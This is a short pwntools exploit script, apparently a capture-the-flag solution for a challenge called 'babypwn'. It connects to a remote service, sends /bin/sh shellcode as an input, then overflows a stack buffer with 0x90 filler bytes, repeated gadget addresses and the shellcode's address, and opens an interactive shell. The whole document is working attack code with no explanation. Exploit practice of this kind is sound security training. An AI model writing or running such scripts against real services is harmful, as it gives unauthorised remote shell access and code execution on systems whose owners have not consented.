from pwn import *
context.log_level='debug'
#p=process("babypwn")
p=remote("stack.overflow.fail",9000)
#gdb.attach(p,'b *0x0000000004007A7 ')
context.arch='amd64'
payload=shellcraft.sh()
payload=asm(payload)
p.sendlineafter("name?\n",payload)
p.sendafter(": ","*\n")
p.sendlineafter(": ","0")
payload="*"*0x90+p64(0x00000000004004f9)*0x50+p64(0x000000000601080)
p.sendlineafter(": ",payload)
p.interactive()
